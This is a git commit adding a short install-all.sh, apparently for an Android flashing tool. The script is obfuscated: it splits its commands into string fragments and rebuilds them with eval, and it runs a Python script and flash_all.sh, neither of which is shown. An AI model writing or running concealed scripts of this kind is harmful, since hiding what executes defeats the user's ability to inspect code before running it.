b3848e5126c245b6f0eb417cb05a347ced981ab8
[_PrĀshĀnT- -SÎNGH_] <139457526+HeartHaNterAlex@users.noreply.github.com>
2023-12-19 13:17:06 +0530

    All file add adb

---
+++ install-all.sh
@@ -0,0 +1,3 @@
+z="
+";Bz='on s';Fz='d +x';Jz='h';Kz='./fl';Hz='sh_a';Gz=' fla';Az='pyth';Cz='yste';Dz='m-4';Lz='ash_';Ez='chmo';Iz='ll.s';Nz='sh';Mz='all.';
+eval "$Az$Bz$Cz$Dz$z$Ez$Fz$Gz$Hz$Iz$Jz$z$Kz$Lz$Mz$Nz"
